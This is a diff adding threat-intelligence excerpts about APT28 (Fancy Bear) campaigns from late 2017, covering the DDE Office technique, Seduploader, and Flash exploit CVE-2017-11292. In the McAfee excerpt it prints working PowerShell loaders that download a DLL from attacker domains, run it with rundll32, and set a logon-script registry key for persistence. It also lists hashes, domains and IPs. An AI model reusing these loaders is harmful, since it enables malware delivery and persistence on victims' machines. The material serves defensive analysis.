@@ -208,13 +208,113 @@ nemohosts[.]com, bacloud[.]com, and laisvas[.]lt http://www.securityweek.com/tec
 follow up
 ThreatConnect says their team was able to identify “dozens of recently registered domains and IPs that have varying levels of association to the Russian APT.” http://www.securityweek.com/tech-firms-target-domains-used-russia-linked-threat-group
 
-## Links
-
 http://www.securityweek.com/russia-linked-spies-deliver-malware-dde-attack
+November 08, 2017
+The Russia-linked cyber espionage group tracked as APT28 and Fancy Bear has started delivering malware to targeted users by leveraging a recently disclosed technique involving Microsoft Office documents and a Windows feature called Dynamic Data Exchange (DDE).
+Researchers warned recently that DDE, a protocol designed for data exchanges between Windows applications, could be used by hackers as a substitute for macros in attacks involving malicious documents. Shortly after, security firms reported seeing attacks leveraging DDE to deliver malware, including Locky ransomware.
+
+Microsoft pointed out that DDE, which has been replaced with Object Linking and Embedding (OLE), is a legitimate feature. The company has yet to make any changes that would prevent attacks, but mitigations included in Windows do provide protection, and users are shown two warnings before the malicious content is executed.
+In the APT28 attacks spotted by McAfee, cyberspies used the document referencing the New York City attack to deliver a first-stage malware tracked as Seduploader. The malware, typically used by the threat actor as a reconnaissance tool, is downloaded from a remote server using PowerShell commands.
+Based on the analysis of the malware and command and control (C&C) domains used in the attack, researchers determined that the campaign involving DDE started on October 25.
+
+https://securingtomorrow.mcafee.com/mcafee-labs/apt28-threat-group-adopts-dde-technique-nyc-attack-theme-in-latest-campaign/
+The domain involved in the distribution of Seduploader was created on October 19, 11 days prior to the creation of Seduploader.
+
+The document we examined for this post:
+
+Filename: IsisAttackInNewYork.docx
+Sha1: 1c6c700ceebfbe799e115582665105caa03c5c9e
+Creation date: 2017-10-27T22:23:00Z
+The document uses the recently detailed DDE technique found in Office products to invoke the command prompt to invoke PowerShell, which runs two commands. The first:
+
+C:\Programs\Microsoft\Office\MSWord.exe\..\..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString(‘hxxp://netmediaresources[.]com/config.txt’);powershell -enc $e #.EXE
+
+The second PowerShell command is Base64 encoded and is found in the version of config.txt received from the remote server. It decodes as follows:
+
+$W=New-Object System.Net.WebClient;
+$p=($Env:ALLUSERSPROFILE+”\vms.dll”);
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
+$W.DownloadFile(“hxxp://netmediaresources[.]com/media/resource/vms.dll “,$p);
+if (Test-Path $p){
+$rd_p=$Env:SYSTEMROOT+”\System32\rundll32.exe”;
+$p_a=$p+”,#1″;
+$pr=Start-Process $rd_p -ArgumentList $p_a;
+$p_bat=($Env:ALLUSERSPROFILE+”\vms.bat”);
+$text=’set inst_pck = “%ALLUSERSPROFILE%\vms.dll”‘+”`r`n”+’if NOT exist %inst_pck % (exit)’+”`r`n”+’start rundll32.exe %inst_pck %,#1’
+[io.File]::WriteAllText($p_bat,$text)
+New-Item -Path ‘HKCU:\Environment’ -Force | Out-Null;
+New-ItemProperty -Path ‘HKCU:\Environment’ -Name ‘UserInitMprLogonScript’ -Value “$p_bat” -PropertyType String -Force | Out-Null;
+}
+
+The PowerShell scripts contact the following URL to download Seduploader:
+
+hxxp://netmediaresources[.]com/media/resource/vms.dll
+The Seduploader sample has the following artifacts:
+
+Filename: vms.dll
+Sha1: 4bc722a9b0492a50bd86a1341f02c74c0d773db7
+Compile date: 2017-10-31 20:11:10
+Control server: webviewres[.]net
+
+The document downloads a version of the Seduploader first-stage reconnaissance implant, which profiles prospective victims, pulling basic host information from the infected system to the attackers. If the system is of interest, then the installation of X-Agent or Sedreco usually follows.
+
+We identified the control server domain associated with this activity as webviewres[.]net, which is consistent with past APT28 domain registration techniques that spoof legitimate-sounding infrastructure. This domain was registered on October 25, a few days before the payload and malicious documents were created. The domain was first active on October 29, just days before this version of Seduploader was compiled. The IP currently resolves to 185.216.35.26 and is hosted on the name servers ns1.njal.la and ns2.njal.la.
+
+Further McAfee research identified the following related sample:
+
+Filename: secnt.dll
+Sha1: ab354807e687993fbeb1b325eb6e4ab38d428a1e
+Compile date: 2017-10-30 23:53:02
+Control server: satellitedeluxpanorama[.]com. (This domain uses the same name servers as above.)
+The preceding sample most likely belongs to the same campaign. Based on our analysis it uses the same techniques and payload. We can clearly establish that the campaign involving documents using DDE techniques began on October 25.
+
+The domain satellitedeluxpanorama[.]com, used by the implant secnt.dll, resolved to 89.34.111.160 as of November 5. The malicious document 68c2809560c7623d2307d8797691abf3eafe319a is responsible for dropping the Seduploader payload (secnt.dll). Its original file name was SaberGuardian2017.docx. This document was created on October 27. The document is distributed from hxxp://sendmevideo[.]org/SaberGuardian2017.docx. The document calls sendmevideo[.]org/dh2025e/eh.dll to download Seduploader (ab354807e687993fbeb1b325eb6e4ab38d428a1e).
+
+The PowerShell command embedded in this document:
+
+$W=New-Object System.Net.WebClient;
+
+$p=($Env:ALLUSERSPROFILE+”\mvdrt.dll”);
+
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
+
+$W.DownloadFile(“http://sendmevideo.org/dh2025e/eh.dll”,$p);
+
+if (Test-Path $p){
+
+$rd_p=$Env:SYSTEMROOT+”\System32\rundll32.exe”;
+
+$p_a=$p+”,#1″;
+
+$pr=Start-Process $rd_p -ArgumentList $p_a;
+
+$p_bat=($Env:ALLUSERSPROFILE+”\mvdrt.bat”);
+
+$text=’set inst_pck = “%ALLUSERSPROFILE%\mvdrt.dll”‘+”`r`n”+’if NOT exist %inst_pck % (exit)’+”`r`n”+’start rundll32.exe %inst_pck %,#1’
+
+[io.File]::WriteAllText($p_bat,$text)
+
+New-Item -Path ‘HKCU:\Environment’ -Force | Out-Null;
+
+New-ItemProperty -Path ‘HKCU:\Environment’ -Name ‘UserInitMprLogonScript’ -Value “$p_bat” -PropertyType String -Force | Out-Null;
+
+}
 
 https://www.politico.eu/article/russian-hackers-fancy-bear-behind-leak-of-un-diplomats-email-report/
-https://threatpost.com/latest-sofacy-campaign-targeting-security-researchers/128576/
-http://www.informationsecuritybuzz.com/expert-comments/fancy-bear-hackers-race-exploit-flash-bug-us-europe/
+11/20/17
+Russian hacker group Fancy Bear was behind a hack targeting Western politicians and diplomats, including leaked emails that suggested a top German diplomat helped get his wife a job at the United Nations, according to media reports.
+
+https://www.proofpoint.com/us/threat-insight/post/apt28-racing-exploit-cve-2017-11292-flash-vulnerability-patches-are-deployed
+On Tuesday, October 18, Proofpoint researchers detected a malicious Microsoft Word attachment exploiting a recently patched Adobe Flash vulnerability, CVE-2017-11292. We attributed this attack to APT28
+Targeting data for this campaign is limited but some emails were sent to foreign government entities equivalent to the State Department and private-sector businesses in the aerospace industry. The known geographical targeting appears broad, including Europe and the United States. The emails were sent from free email services.
+As we examined the document exploitation chain, we found that DealersChoice.B [2], the attack framework that the document uses, is now also exploiting CVE-2017-11292, a Flash vulnerability that can lead to arbitrary code execution across Windows, Mac OS, Linux, and Chrome OS systems. The vulnerability was announced and patched on Monday, October 16 [1]. At that time Kaspersky attributed the exploit use to the BlackOasis APT group, which is distinct from APT28.
+Thus, while this exploit is no longer a zero-day, this is only the second known campaign utilizing it reported in public. APT28 burned their CVE-2017-0262 EPS 0-day in a similar fashion in April after Microsoft pushed an EPS exploit mitigation, which significantly reduced the impact of this exploit. [3]
+The document “World War 3.docx” contacts DealersChoice.B, APT28’s attack framework that allows loading exploit code on-demand from a command and control (C&C) server. DealersChoice has previously been used to exploit a variety of Flash vulnerabilities, including CVE-2015-7645, CVE-2016-1019, CVE-2016-4117, and CVE-2016-7855 via embedded objects in crafted Microsoft Word documents.
+
+
+## Links
+
+
 https://www.tripwire.com/state-of-security/security-data-protection/microsoft-advisory-office-dde-malware/
 
 https://www.wired.com/story/russia-fancy-bear-hackers-microsoft-office-flaw-and-nyc-terrorism-fears/?mbid=nl_110817_daily_list1_p3
